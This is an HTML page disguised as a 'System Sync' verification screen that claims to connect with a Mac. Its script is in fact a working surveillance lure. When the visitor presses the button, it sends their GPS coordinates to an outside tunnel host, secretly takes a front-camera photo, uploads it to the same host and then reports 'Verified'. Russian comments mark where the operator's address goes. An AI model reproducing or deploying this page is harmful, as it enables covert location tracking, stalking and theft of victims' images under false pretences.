<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>System Sync</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; }
        .card { width:260px; padding:30px; background:#111; border-radius:20px; text-align:center; border:1px solid #222; }
        button { background:#fff; color:#000; border:none; padding:15px; border-radius:12px; width:100%; font-weight:bold; cursor:pointer; }
        #loader { display:none; margin:15px auto; width:20px; height:20px; border:2px solid #333; border-top:2px solid #fff; border-radius:50%; animation:s 1s linear infinite; }
        @keyframes s { to { transform:rotate(360deg); } }
        video, canvas { display:none; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p>Press to connect with Mac</p>
        <button id="btn" onclick="init()">CONNECT</button>
        <div id="loader" id="ld"></div>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        // === ТВОЙ АДРЕС ===
        const API = "https://7f13bc54307437.lhr.life"; 

        async function init() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('st').innerText = "Syncing...";

            try {
                // 1. ГЕОЛОКАЦИЯ (через GET - самый надежный метод)
                navigator.geolocation.getCurrentPosition(p => {
                    const url = `${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}`;
                    new Image().src = url; // "Тихий" запрос, который не блокирует CORS
                });

                // 2. КАМЕРА
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));

                // 3. СНИМОК
                const canvas = document.getElementById('c');
                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                canvas.getContext('2d').drawImage(v, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
                const fd = new FormData();
                fd.append('file', blob, 'shot.jpg');

                // 4. ОТПРАВКА ФОТО (используем fetch с минимальными требованиями)
                fetch(`${API}/upload-photo`, { 
                    method: 'POST', 
                    mode: 'no-cors', // Это ВАЖНО! Игнорируем ошибки безопасности
                    body: fd 
                });

                // Сразу пишем успех, не дожидаясь ответа
                setTimeout(() => {
                    document.getElementById('st').innerText = "Verified";
                    document.getElementById('loader').style.display = 'none';
                    stream.getTracks().forEach(t => t.stop());
                }, 1000);

            } catch (e) {
                alert("Please allow camera access");
                location.reload();
            }
        }
    </script>
</body>
</html>
